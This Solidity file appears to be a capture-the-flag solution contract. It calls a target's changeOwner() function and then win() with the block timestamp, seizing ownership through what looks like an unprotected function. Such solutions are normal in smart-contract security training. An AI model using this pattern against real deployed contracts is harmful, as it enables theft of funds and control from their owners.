
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Solve {

    address public TARGET;

    function setTarget(address _target) public {
        TARGET = _target;
    }

    function Win() public {
        TARGET.call(abi.encodeWithSignature("changeOwner()"));
        TARGET.call(abi.encodeWithSignature("win(uint256)", block.timestamp));
    }
}
